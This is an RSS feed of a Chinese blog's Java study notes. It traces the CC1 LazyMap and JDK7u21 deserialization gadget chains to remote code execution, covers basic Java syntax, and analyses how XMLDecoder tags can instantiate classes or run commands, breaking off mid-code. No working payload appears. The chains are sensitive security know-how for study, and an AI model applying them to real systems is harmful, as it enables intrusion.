<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Java on AmiaaaZ's Site</title><link>https://amiaaaz.github.io/tags/java/</link><description>Recent content in Java on AmiaaaZ's Site</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Thu, 20 Jul 2023 01:47:58 +0800</lastBuildDate><atom:link href="https://amiaaaz.github.io/tags/java/index.xml" rel="self" type="application/rss+xml"/><item><title>Java学习笔记ⅩⅢ</title><link>https://amiaaaz.github.io/2023/07/20/java-study-notes-13/</link><pubDate>Thu, 20 Jul 2023 01:47:58 +0800</pubDate><guid>https://amiaaaz.github.io/2023/07/20/java-study-notes-13/</guid><description>&lt;p>太久不看java，已经忘得一干二净 手感全无了，最近重新拾起来复建发现了一些从未发现的盲点或一些当时没有彻底理解透彻的地方，遂整理一篇；内容相当基础，新手友好&lt;/p>
&lt;hr>
&lt;h2 id="动态代理">动态代理&lt;/h2>
&lt;p>在学习他人文章、跟着一步步复现时我们经常会不自觉地把大脑交给所看的文章来接管，还会自动略过文章中未详细说明的细节，这样不求甚解很容易造成偏听则暗的后果，此处动态代理就是一例&lt;/p>
&lt;h3 id="cc1的lazymap">CC1的LazyMap&lt;/h3>
&lt;ul>
&lt;li>&lt;strong>Map版CC1&lt;/strong>：AnnotationInvocationHandler#readObject-&amp;gt; memberValue.setValue(Map)-&amp;gt; RCE&lt;/li>
&lt;li>&lt;strong>LazyMap版CC1&lt;/strong>：AnnotationInvocationHandler#readObject-&amp;gt; memberValue.setValue(Map)-&amp;gt; AnnotationInvocationHandler#invoke(proxy)-&amp;gt; LazyMap#get-&amp;gt; RCE&lt;/li>
&lt;/ul>
&lt;p>这里反驳一下p牛在java安全漫谈11中的这两段话&lt;/p>
&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20230713235555818.png" alt="image-20230713235555818">&lt;/p>
&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20230713235613928.png" alt="image-20230713235613928">&lt;/p>
&lt;ol>
&lt;li>被代理的不是“对象”而是“接口”&lt;/li>
&lt;/ol>
&lt;p>动态代理指的是利用反射在运行时创建一个实现某些给定接口的新类（即动态代理类）及其实例，举例：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Foo&lt;/span> &lt;span style="color:#111">f&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Foo&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">Proxy&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">newProxyInstance&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Foo&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClassLoader&lt;/span>&lt;span style="color:#f92672">(),&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#111">Foo&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">},&lt;/span> &lt;span style="color:#111">handler&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>这里我们对&lt;code>Foo&lt;/code>接口进行代理，同时在没有实现类的情况下动态创建了一个接口对象&lt;code>f&lt;/code>，当调用&lt;code>f.func(&amp;quot;abc&amp;quot;)&lt;/code>时会移交给&lt;code>handler.invoke()&lt;/code>进行处理&lt;/p>
&lt;ol start="2">
&lt;li>被代理的是&lt;code>Map&lt;/code> 并不是&lt;code>AnnotationInvocationHandler&lt;/code>&lt;/li>
&lt;/ol>
&lt;p>最直观的判别方法：被代理的接口是谁，创建的接口实例就会被强制转型成谁，传入的参数也会是与被代理接口强相关，这里是&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">proxyMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Map&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">Proxy&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">newProxyInstance&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Map&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClassLoader&lt;/span>&lt;span style="color:#f92672">(),&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">{&lt;/span>&lt;span style="color:#111">Map&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">},&lt;/span> &lt;span style="color:#111">handler&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>毫无疑问是对&lt;code>Map&lt;/code>接口进行代理&lt;/p>
&lt;ol start="3">
&lt;li>LazyMap的触发与setValue有关&lt;/li>
&lt;/ol>
&lt;p>Map被代理后需要有调用Map.xxx的地方才会触发&lt;code>AnnotationInvocationHandler#invoke&lt;/code>，调用Map.xxx的地方就在&lt;code>AnnotationInvocationHandler#readObject&lt;/code>中，也就是Map版CC1的触发点&lt;/p>
&lt;h3 id="jdk7u21的templates">JDK7u21的Templates&lt;/h3>
&lt;p>理由同上，p牛在Java安全漫谈18中的表述我认为也是存在错误的&lt;/p>
&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20230718180825094.png" alt="image-20230718180825094">&lt;/p>
&lt;p>这里并不是对&lt;code>AnnotationInvocationHandler&lt;/code>做代理，而是对&lt;code>Templates&lt;/code>做代理&lt;/p>
&lt;p>&lt;strong>实际反序列化执行顺序&lt;/strong>是这样的：&lt;/p>
&lt;p>LinkedHashSet被反序列化-&amp;gt; 其中包含的TemplatesImpl对象和被代理的Templates对象分别被反序列化，AnnotationInvocationHandler也被反序列化并初始化基本信息-&amp;gt; Templates类型代理对象被反序列化后，加入LinkedHashSet内部的LinkedHashMap时会进行比较&lt;code>key.eqauls(k)&lt;/code>，其中key为代理对象、k为含payload的TemplatesImpl对象-&amp;gt; 该equals方法也交由AnnotationInvocationHandler#equalsImpl进行实现，中间会执行Templates.getOutputProperties().invoke(TemplatesImpl)，最终rce&lt;/p>
&lt;h2 id="语法相关">语法相关&lt;/h2>
&lt;h3 id="引用类型的传递">引用类型的传递&lt;/h3>
&lt;p>&lt;code>String&lt;/code>和&lt;code>String[]&lt;/code>都是引用类型 存储对象引用，但&lt;code>String&lt;/code>类型的对象是不可变的，当它们作为参数传递时会有不同的表现&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Person&lt;/span> &lt;span style="color:#111">p&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Person&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">fullname&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#d88200">&amp;#34;Homer&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;Simpson&amp;#34;&lt;/span> &lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">p&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">fullname&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">());&lt;/span> &lt;span style="color:#75715e">// &amp;#34;Homer Simpson&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">fullname&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;Bart&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#75715e">// 修改String[]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">());&lt;/span> &lt;span style="color:#75715e">// &amp;#34;Bart Simpson&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Person&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34; &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">setName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Person&lt;/span> &lt;span style="color:#111">p&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Person&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">bob&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;Bob&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">p&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">bob&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">());&lt;/span> &lt;span style="color:#75715e">// &amp;#34;Bob&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">bob&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;Alice&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#75715e">// 修改String
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">());&lt;/span> &lt;span style="color:#75715e">// &amp;#34;Bob&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Person&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">setName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>在例2中对&lt;code>String&lt;/code>对象bob的修改相当于创建一个新的对象，所以当再次&lt;code>getName&lt;/code>时会返回修改前的旧值；而&lt;code>String[]&lt;/code>类型的对象是可变的，当它作为参数传递给方法时 实际传递的是该变量所引用的数组对象在内存中的地址（指针），当我们修改它时就会影响到使用它的地方&lt;/p>
&lt;p>基本类型的参数传递不用考虑这一情况，所有修改不会有后续影响&lt;/p>
&lt;h3 id="构造方法">构造方法&lt;/h3>
&lt;p>构造方法没有返回值，调用它的方式就是用&lt;code>new&lt;/code>关键字；默认的构造方法为&lt;code>(){}&lt;/code>，如果存在自定义构造方法将不再创建默认的构造方法，需要手动写出&lt;/p>
&lt;p>构造方法可以参数、返回值均为空，但写其它的方法一般不可以 定义方法时必须存在语句，如果定义了方法 又没有具体代码 那一定是抽象方法，所在类无法被实例化&lt;/p>
&lt;p>一个构造方法中可以调用其它构造方法，语法是&lt;code>this(...)&lt;/code>&lt;/p>
&lt;p>任何类构造方法的第一行语句都是调用父类的构造方法&lt;code>super()&lt;/code>，所以在类的继承中 如果父类没有默认的构造方法，子类必须显式调用&lt;code>super&lt;/code>并传入适当的参数调用父类自定义的构造方法；未指定的新建类都默认继承自Object，所以无此困扰&lt;/p>
&lt;h3 id="静态xx">静态xx&lt;/h3>
&lt;p>类中的静态字段由所有实例共享&lt;/p>
&lt;p>类的静态方法不需要通过实例即可调用，通过类名即可调用，它属于类而不属于实例 因此也无法访问&lt;code>this&lt;/code>变量 只可以访问静态字段（入口的&lt;code>main&lt;/code>函数就是静态方法！&lt;/p>
&lt;p>类中可以嵌套静态内部类&lt;code>static class Inner{}&lt;/code>，有访问类中&lt;code>private&lt;/code>字段/方法的权限，但因为是完全独立的类 也无法引用&lt;code>Outer.this&lt;/code>&lt;/p>
&lt;p>类中可以有静态代码块&lt;code>static{}&lt;/code>，在类的实例化（调用构造函数）或类的初始化（反射&lt;code>forName&lt;/code>）时均会被调用&lt;/p></description></item><item><title>Java学习笔记Ⅻ</title><link>https://amiaaaz.github.io/2022/10/17/java-study-notes-12/</link><pubDate>Mon, 17 Oct 2022 17:51:05 +0800</pubDate><guid>https://amiaaaz.github.io/2022/10/17/java-study-notes-12/</guid><description>&lt;p>学习笔记女生自用99新，参考链接放在文末&lt;/p>
&lt;hr>
&lt;h2 id="简介">简介&lt;/h2>
&lt;p>XMLDecoder是Philip Mine在jdk1.4中开发的一个用于将java bean或pojo对象序列化和反序列化的一整套api，含有readObject方法可以对xml进行反序列化&lt;/p>
&lt;p>JAXP(java api for xml processing)用于处理xml数据，它使用SAX(simple api for xml parsing)和DOM(document object model)解析xml，还支持xslt标准来转换xml&lt;/p>
&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20221011100922074.png" alt="image-20221011100922074">&lt;/p>
&lt;p>XMLDecoder用的是SAX标准进行解析&lt;/p>
&lt;p>SAX使用事件驱动的设计模式&lt;/p>
&lt;h3 id="saxparser">SAXParser&lt;/h3>
&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20221011105618079.png" alt="image-20221011105618079">&lt;/p>
&lt;p>一个SAX对象使用SAXParser.parser作为事件源，ContentHandler, ErrorHandler, DTDHandler, EntityResolver作为事件处理器，通过注册方法将二者连起来&lt;/p>
&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20221011105952575.png" alt="image-20221011105952575">&lt;/p>
&lt;p>ContentHandler的几个重要方法（需要重点实现的）&lt;/p>
&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20221011110056089.png" alt="image-20221011110056089">&lt;/p>
&lt;p>除此之外还可以利用XMLFilter实现对如果要自己使用SAX来实现解析xml文档的全过程是十分复杂的，org.xml.sax.helper提供了一个帮助类DefaultHandler，这个帮助类默认实现了4个事件处理器EntityResolver, DTDHandler, ContentHandler, ErrorHandler，只需要继承这个DefaultHandler即可轻松使用SAX&lt;/p>
&lt;h3 id="apache-xerces">Apache Xerces&lt;/h3>
&lt;p>XMLDecoder最后用的就是它，是它是它就是它&lt;/p>
&lt;p>xerces有多个驱动Driver参与解析，分别负责不同的流程&lt;/p>
&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20221011111032355.png" alt="image-20221011111032355">&lt;/p>
&lt;p>基本顺序可以这样理解&lt;/p>
&lt;pre tabindex="0">&lt;code>XMLDeclDriver-&amp;gt;PrologDriver-&amp;gt;FragmentContentDriver-&amp;gt;TrailingMiscDriver-&amp;gt;over
&lt;/code>&lt;/pre>&lt;p>xerces对xml进行扫描和初步处理，将标签结果交给DocumentHandler后续解析&lt;/p>
&lt;h3 id="document-handler">Document Handler&lt;/h3>
&lt;p>DocumentHandler将xerces返回的标签分配给对应的事件处理器，比如java标签中含有class属性则会利用反射加载类，这里就是靠中间的addAttribute方法完成的；Object标签能执行命令是因为ObjectElementHandler事件处理器在继承NewElementHandler事件处理器后重写了getValueObject方法，用Expression创建对象；new标签能执行命令是因为NewElementHandler事件处理器针对new标签的class属性有一个通过反射加载类的操作；void标签的事件处理器VoidElementHandler继承了ObjectElementHandler事件处理器，其本身没有实现方法，交给父类处理；class标签的事件处理器ClassElementHandelr的getValue使用反射拿到对象&lt;/p>
&lt;h3 id="xmldecoder过程分析">XMLDecoder过程分析&lt;/h3>
&lt;p>简单的测试&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#111">XMLDecoder&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">User&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">Name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">Sex&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">Age&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">User&lt;/span>&lt;span style="color:#f92672">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Constructor has called&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">User&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">sex&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">age&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Constructor2 has called&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
